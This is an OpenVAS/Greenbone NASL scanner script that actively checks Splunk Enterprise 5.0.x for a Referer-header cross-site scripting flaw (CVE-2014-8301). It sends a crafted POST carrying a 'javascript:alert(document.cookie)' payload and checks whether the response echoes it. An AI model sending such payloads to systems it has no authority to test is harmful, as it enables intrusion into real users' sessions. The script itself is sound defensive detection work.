# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:splunk:splunk";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805333");
  script_version("2024-01-25T14:38:15+0000");
  script_tag(name:"last_modification", value:"2024-01-25 14:38:15 +0000 (Thu, 25 Jan 2024)");
  script_tag(name:"creation_date", value:"2015-02-05 12:04:16 +0530 (Thu, 05 Feb 2015)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-8301");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Splunk Enterprise 5.0.x < 5.0.10 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_splunk_http_detect.nasl");
  script_mandatory_keys("splunk/http/detected");
  script_require_ports("Services/www", 8000);

  script_tag(name:"summary", value:"Splunk is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"XSS due to improper validation of user-supplied input passed
  via the 'Referer' header before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute
  arbitrary script code in a user's browser session within the trust relationship between their
  browser and the server.");

  script_tag(name:"affected", value:"Splunk version 5.0.x prior to 5.0.10.");

  script_tag(name:"solution", value:"Update to version 5.0.10 or later.");

  script_xref(name:"URL", value:"http://www.splunk.com/view/SP-CAAANHS#announce4");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

req = http_get(port: port, item: dir + "/account/login");
res = http_keepalive_send_recv(port: port, data: req);

ses_id = eregmatch(pattern: string("session_id_", port, "=([0-9a-z]*)"), string: res);
if (isnull(ses_id[1]))
   exit(0);

host = http_host_name(port: port);

url = dir + "/i18ncatalog?autoload=1";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept-Encoding: gzip, deflate", "\r\n",
             "Referer:javascript:alert(document.cookie)", "\r\n",
             "Cookie: ses_id_", port, "=", ses_id[1], "\r\n",
             "Content-Length: 0","\r\n\r\n");
res = http_send_recv(port: port, data: req);

if ("alert(document.cookie)" >< res && ">405 Method Not Allowed<" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
